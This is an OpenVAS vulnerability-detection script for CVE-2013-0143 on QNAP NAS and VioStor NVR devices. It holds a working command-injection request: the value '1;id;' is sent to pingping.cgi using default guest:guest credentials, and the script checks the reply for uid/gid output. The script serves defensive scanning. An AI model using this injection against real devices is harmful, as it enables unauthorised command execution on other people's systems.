###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_qnap_cve_2013_0143.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# VioStor NVR and QNAP NAS Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103731");
  script_version("$Revision: 11865 $");
  script_cve_id("CVE-2013-0143");
  script_tag(name:"cvss_base", value:"6.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");

  script_name("VioStor NVR and QNAP NAS Remote Code Execution Vulnerability");

  script_xref(name:"URL", value:"http://www.qnap.com/");
  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/927644");
  script_xref(name:"URL", value:"http://www.h-online.com/security/news/item/Serious-vulnerabilities-in-QNAP-storage-and-surveillance-systems-1883263.html");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-06-07 10:32:41 +0200 (Fri, 07 Jun 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("http_server/banner");
  script_require_ports("Services/www", 80, 8080);
  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");
  script_tag(name:"summary", value:"VioStor NVR firmware version 4.0.3 and possibly earlier versions and QNAP NAS
with the Surveillance Station Pro activated contains scripts which could allow
any user e.g. guest users to execute scripts which run with administrative
privileges. It is possible to execute code on the webserver using the ping
function.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("misc_func.inc");

port = get_http_port(default:80);
banner = get_http_banner(port:port);
if(!banner || "Server: http server" >!< banner)exit(0);

url = '/cgi-bin/pingping.cgi?ping_ip=1;id;';

userpass64 = base64(str:"guest:guest"); # i've seen hosts where no basic auth was needed to execute a command.

host = http_host_name(port:port);

req = 'GET ' + url + ' HTTP/1.1\r\n' +
      'Host: ' +  host + '\r\n' +
      'Authorization: Basic ' + userpass64 + '\r\n' +
      '\r\n';
resp = http_send_recv(port:port, data:req);

if(resp =~ "uid=[0-9]+.*gid=[0-9]+.*") {
  msg = 'By sending the request:\n\n' + req + '\n\nwe received the following response:\n\n' + resp;
  security_message(port:port, data:msg);
  exit(0);
}

exit(0);
